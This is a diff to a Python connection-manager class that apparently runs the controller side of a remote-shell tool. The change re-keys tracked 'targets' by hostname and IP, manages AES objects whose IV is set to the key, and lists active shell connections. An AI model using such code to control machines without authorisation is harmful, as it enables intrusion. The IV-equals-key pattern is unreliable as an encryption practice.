@@ -14,54 +14,59 @@ class ConnectionManager(object):
 
     def insertNewConnction(self, conn, clientInfo):
         ip = conn.getpeername()[0]
+        info = self._parseClientInfo(clientInfo,ip)
         if ip not in self.connections.keys(): 
-            self.connections[ip] = self._parseClientInfo(clientInfo)
+            id = f"{info['Hostname']}:{ip}"
+            self.connections[id] = info
 
-    def connectToTarget(self,conn):
+    def connectToTarget(self,conn, id):
         conn.send(urandom(16))
-        ip = conn.getpeername()[0]
-        name = self.connections[ip]['Hostname']
-        self.connections[ip]['connected'] = True
-        self.connectedObjects[ip] = Connection(conn=conn,hostname=name,ip=ip)
+        self.connections[id]['connected'] = True
+        self.connectedObjects[id] = Connection(conn=conn,id=id)
         self.connctTo = None
 
 
-    def _parseClientInfo(self,clientInfo):
-        return {**{'connected': False},**json.loads(clientInfo)}
+    def _parseClientInfo(self,clientInfo, ip):
+        return {**{'connected': False,'ip':ip},**json.loads(clientInfo)}
     
 
-    def addAesToconnection(self,conn, aesObj):
+    def addAesToconnection(self,id, aesObj):
         aesObj.set_iv(aesObj.key)
-        self.connectedObjects[conn.getpeername()[0]].aes = aesObj
+        self.connectedObjects[id].aes = aesObj
         self.keys.append(sha1(aesObj.key))
 
-    def removeConnection(self,conn):
-        del self.connections[conn.getpeername()]
+    def removeConnection(self,id):
+        del self.connections[id]
         
-    def getFixedConnection(self,conn):
-        return self.connectedObjects[conn.getpeername()[0]]
+    def getFixedConnection(self,id):
+        return self.connectedObjects[id]
     
-    def isconnected(self,ip):
-        if ip not in self.connections.keys():
+    def isconnected(self,id):
+        if id not in self.connections.keys():
             return False
-        return self.connections[ip]['connected']
+        return self.connections[id]['connected']
     
-    def getConnObj(self,ip) -> Connection:
-        return self.connectedObjects[ip]
+    def getConnObj(self,id) -> Connection:
+        return self.connectedObjects[id]
     
-    def alive(self,ip):
-        return ip in self.connections.keys()
+    def alive(self,id):
+        return id in self.connections.keys()
     
     def getShellConntions(self):
-        return {
-            self.connectedObjects[i].ip: self.connectedObjects[i].hostname
+        for i in self.connectedObjects.keys():
+            print(f"id: {self.connectedObjects[i].id}")
+        return [
+            self.connectedObjects[i].id
             for i in self.connectedObjects.keys()
-        }
+        ]
     
-    def disconnect(self,ip):
-        if ip in self.connectedObjects.keys():
-            self.getConnObj(ip).sendMsg(b'exit')
-            del self.connectedObjects[ip]
-        self.connections[ip]['connected'] = False
+    def getId(self,clientInfo, ip):
+        return f"{json.loads(clientInfo)['Hostname']}:{ip}"
+    
+    def disconnect(self,id):
+        if id in self.connectedObjects.keys():
+            self.getConnObj(id).sendMsg(b'exit')
+            del self.connectedObjects[id]
+        self.connections[id]['connected'] = False
         
 
